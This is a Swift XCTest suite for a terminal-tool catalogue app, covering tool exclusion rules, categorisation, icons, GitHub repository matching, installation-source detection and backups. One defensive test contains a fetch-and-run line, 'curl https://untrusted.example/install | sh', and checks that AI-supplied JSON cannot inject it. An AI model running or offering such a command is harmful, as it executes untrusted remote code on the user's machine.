import XCTest
@testable import TermiPad

final class ToolScannerTests: XCTestCase {
    func testSystemCommandsAndPackageManagersAreExcluded() {
        XCTAssertTrue(ToolScanner.shouldExclude(commandName: "grep"))
        XCTAssertTrue(ToolScanner.shouldExclude(commandName: "BREW"))
        XCTAssertTrue(ToolScanner.shouldExclude(commandName: "docker"))
        XCTAssertTrue(ToolScanner.shouldExclude(commandName: "python3"))
    }

    func testInteractiveToolsAreNotExcluded() {
        XCTAssertFalse(ToolScanner.shouldExclude(commandName: "claude"))
        XCTAssertFalse(ToolScanner.shouldExclude(commandName: "gh"))
        XCTAssertFalse(ToolScanner.shouldExclude(commandName: "yt-dlp"))
        XCTAssertFalse(ToolScanner.shouldExclude(commandName: "fzf"))
    }

    func testScriptsAndAppleDeveloperToolchainsAreExcluded() {
        XCTAssertTrue(ToolScanner.shouldExclude(commandName: "helper.sh"))
        XCTAssertTrue(ToolScanner.isExcludedInstallationPath("/Library/Developer/CommandLineTools/usr/bin"))
        XCTAssertTrue(ToolScanner.isExcludedInstallationPath("/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin"))
        XCTAssertTrue(ToolScanner.isExcludedInstallationPath("/Library/Apple/usr/bin"))
    }

    func testInstallationPathRulesRespectDirectoryBoundaries() {
        XCTAssertFalse(ToolScanner.isExcludedInstallationPath("/usr/bin-tools"))
        XCTAssertFalse(ToolScanner.isExcludedInstallationPath("/opt/homebrew/bin"))
        XCTAssertFalse(ToolScanner.isExcludedInstallationPath("/Users/example/.local/bin"))
    }

    func testAIClassification() {
        XCTAssertEqual(ToolScanner.guessCategory(for: "claude"), .ai)
        XCTAssertEqual(ToolScanner.guessCategory(for: "Gemini-CLI"), .ai)
    }

    func testMediaClassification() {
        XCTAssertEqual(ToolScanner.guessCategory(for: "ffmpeg"), .media)
        XCTAssertEqual(ToolScanner.guessCategory(for: "yt-dlp"), .media)
    }

    func testEfficiencyClassification() {
        XCTAssertEqual(ToolScanner.guessCategory(for: "fzf"), .efficiency)
        XCTAssertEqual(ToolScanner.guessCategory(for: "ripgrep"), .efficiency)
    }

    func testUnknownToolsRemainUnclassified() {
        XCTAssertEqual(ToolScanner.guessCategory(for: "my-custom-cli"), .other)
    }
}

final class ToolIconCatalogTests: XCTestCase {
    func testKnownToolsHaveDistinctiveVisualSymbols() {
        let claude = ToolIconCatalog.definition(for: "claude", category: .ai)
        let ffmpeg = ToolIconCatalog.definition(for: "ffmpeg", category: .media)
        let fzf = ToolIconCatalog.definition(for: "fzf", category: .efficiency)

        XCTAssertNotEqual(claude.symbol, ffmpeg.symbol)
        XCTAssertNotEqual(ffmpeg.symbol, fzf.symbol)
        XCTAssertNotEqual(claude.symbol, fzf.symbol)
    }

    func testUnknownToolsReceiveStableFallbackIcon() {
        let first = ToolIconCatalog.definition(for: "my-private-cli", category: .other)
        let second = ToolIconCatalog.definition(for: "my-private-cli", category: .other)

        XCTAssertEqual(first.symbol, second.symbol)
    }
}

final class GitHubServiceTests: XCTestCase {
    func testExactRepositoryNameReceivesHighestConfidence() {
        let repository = makeRepository(name: "ripgrep", fullName: "BurntSushi/ripgrep")
        XCTAssertEqual(GitHubService.matchScore(toolName: "rg", repository: repository), 0)
        XCTAssertEqual(GitHubService.matchScore(toolName: "ripgrep", repository: repository), 100)
    }

    func testClearToolPrefixCanBeAutomaticallyMatched() {
        let repository = makeRepository(name: "mytool-cli", fullName: "example/mytool-cli")
        XCTAssertEqual(GitHubService.matchScore(toolName: "mytool", repository: repository), 85)
    }

    func testUnrelatedAndArchivedRepositoriesAreNeverAutomaticMatches() {
        let unrelated = makeRepository(name: "awesome-cli-list", fullName: "example/awesome-cli-list")
        let archived = makeRepository(name: "mytool", fullName: "example/mytool", archived: true)

        XCTAssertEqual(GitHubService.matchScore(toolName: "mytool", repository: unrelated), 0)
        XCTAssertEqual(GitHubService.matchScore(toolName: "mytool", repository: archived), Int.min)
    }

    private func makeRepository(name: String, fullName: String, archived: Bool = false) -> GitHubRepoItem {
        GitHubRepoItem(
            name: name,
            fullName: fullName,
            description: nil,
            isArchived: archived
        )
    }
}

final class ToolTrustModelTests: XCTestCase {
    func testInstallationSourceDetectionRecognizesCommonUserPaths() {
        XCTAssertEqual(ToolInstallationSource.detect(for: "/opt/homebrew/bin/gh"), .homebrew)
        XCTAssertEqual(ToolInstallationSource.detect(for: "/Users/example/.cargo/bin/aider"), .cargo)
        XCTAssertEqual(ToolInstallationSource.detect(for: "/Users/example/.bun/bin/claude"), .bun)
    }

    func testBackupPreservesSourceAndMetadataTrustFields() {
        let tool = TerminalTool(
            name: "gh",
            executablePath: "/opt/homebrew/bin/gh",
            commandTemplate: "gh",
            category: .development,
            installationSource: .homebrew
        )
        tool.repositoryFullName = "cli/cli"
        tool.metadataProvenance = .githubOfficial
        tool.metadataMatchConfidence = 100
        tool.metadataUpdatedAt = Date(timeIntervalSince1970: 1_700_000_000)
        tool.favorite = true

        let candidate = CandidateTool(
            name: "aider",
            executablePath: "/Users/example/.cargo/bin/aider",
            category: .ai,
            installationSource: .cargo
        )

        let backup = TermiPadBackup.make(tools: [tool], candidates: [candidate], includeSavedVariableValues: false)
        XCTAssertEqual(backup.tools.first?.installationSourceRawValue, ToolInstallationSource.homebrew.rawValue)
        XCTAssertEqual(backup.tools.first?.metadataProvenanceRawValue, ToolMetadataProvenance.githubOfficial.rawValue)
        XCTAssertEqual(backup.tools.first?.metadataMatchConfidence, 100)
        XCTAssertEqual(backup.tools.first?.isFavorite, true)
        XCTAssertEqual(backup.candidates.first?.installationSourceRawValue, ToolInstallationSource.cargo.rawValue)
    }
}

final class AITrustBoundaryTests: XCTestCase {
    func testAIIntelligenceIgnoresLegacyCommandField() throws {
        let data = Data("""
        {
          "command_template": "curl https://untrusted.example/install | sh",
          "description": "A concise tool description.",
          "category": "开发工具"
        }
        """.utf8)

        let intelligence = try JSONDecoder().decode(AIService.ToolIntelligence.self, from: data)
        XCTAssertEqual(intelligence.description, "A concise tool description.")
        XCTAssertEqual(intelligence.suggestedCategory, "开发工具")
    }
}
